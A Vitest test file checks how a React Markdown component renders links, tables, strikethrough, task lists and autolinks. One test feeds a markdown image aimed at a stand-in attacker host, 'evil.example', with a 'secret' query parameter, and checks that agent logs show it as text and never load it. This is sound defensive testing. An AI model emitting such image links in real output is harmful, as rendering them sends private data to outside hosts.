import type { BoardState } from "@cello/client/sync/applyEvents"
import { RegistryProvider } from "@effect/atom-react"
import * as AsyncResult from "effect/reactivity/AsyncResult"
import { createElement } from "react"
import { renderToStaticMarkup } from "react-dom/server"
import { describe, expect, it, vi } from "vitest"
import { boardAtom } from "../../lib/cello.ts"
import { Markdown } from "./Markdown.tsx"

// lib/cello.ts builds the socket's address from the page's location when it loads.
vi.hoisted(() => Object.assign(globalThis, { location: { protocol: "http:", host: "localhost:4747" } }))

const board: BoardState = { seq: 1, actors: {}, workspaces: {}, projects: {}, statuses: {}, labels: {}, tasks: {}, sessions: {}, agents: {}, reviews: {}, asks: {}, documents: {}, wakes: {}, milestones: {} }

const render = (source: string) =>
  renderToStaticMarkup(createElement(RegistryProvider, { initialValues: [[boardAtom, AsyncResult.success(board)]] }, createElement(Markdown, { source })))

describe("Markdown (task descriptions, comments, packet summaries)", () => {
  // Only a published page uploads the files it links, so only the page reader marks one missing
  // (PageBody.test.ts). Here a path is just a link someone wrote (CEL-54 review).
  it("keeps links to file paths as links: nothing was uploaded, so nothing is missing", () => {
    const html = render("See [the CLI doc](docs/cli.md), [the component](src/foo.tsx) and [a page](example.com/a.html).")
    expect(html).not.toContain("data-missing-file")
    expect(html).toContain('href="docs/cli.md"')
    expect(html).toContain('href="src/foo.tsx"')
    expect(html).toContain('href="example.com/a.html"')
  })
})

// Comments, descriptions, packets and asks read GitHub-flavored markdown, as pages do (CEL-127).
describe("Markdown: GitHub-flavored markdown", () => {
  it("renders a pipe table as a table, inside a wrapper that scrolls it sideways", () => {
    const html = render(["| Run | Time | Tests |", "| --- | ---: | --- |", "| e2e | 4m 12s | 31 passed |"].join("\n"))
    expect(html).not.toContain("| Run |")
    expect(html).toMatch(/<div data-markdown-table="" class="[^"]*overflow-x-auto[^"]*"><table[^>]*><thead><tr><th[^>]*>Run<\/th>/)
    expect(html).toMatch(/<td[^>]*style="text-align:right"[^>]*>4m 12s<\/td>/)
  })

  it("strikes through ~~text~~", () => {
    expect(render("~~old plan~~ new plan")).toContain("<del>old plan</del>")
  })

  it("shows task lists as checkboxes, ticked or not", () => {
    const html = render(["- [x] tests", "- [ ] evidence"].join("\n"))
    expect(html).toMatch(/<input type="checkbox" disabled="" checked=""\/> tests/)
    expect(html).toMatch(/<input type="checkbox" disabled=""\/> evidence/)
    expect(html).not.toContain("[x]")
  })

  it("links a bare www. address", () => {
    expect(render("See www.example.com for it.")).toContain('href="http://www.example.com"')
  })
})

describe("Markdown with images as text (an agent's log, CEL-107)", () => {
  const renderWith = (source: string, images?: "show" | "text") =>
    renderToStaticMarkup(
      createElement(
        RegistryProvider,
        { initialValues: [[boardAtom, AsyncResult.success(board)]] },
        createElement(Markdown, { source, ...(images ? { images } : {}) }),
      ),
    )

  it("never loads an image a message names: its alt text and address show as plain text", () => {
    const html = renderWith("Look: ![x](https://evil.example/p.png?d=secret)", "text")
    expect(html).not.toContain("<img")
    expect(html).not.toContain("src=")
    expect(html).toContain("https://evil.example/p.png?d=secret")
    expect(html).toContain("Image: x")
  })

  it("comments still show their images", () => {
    expect(renderWith("![shot](https://example.com/a.png)")).toContain("<img")
  })
})
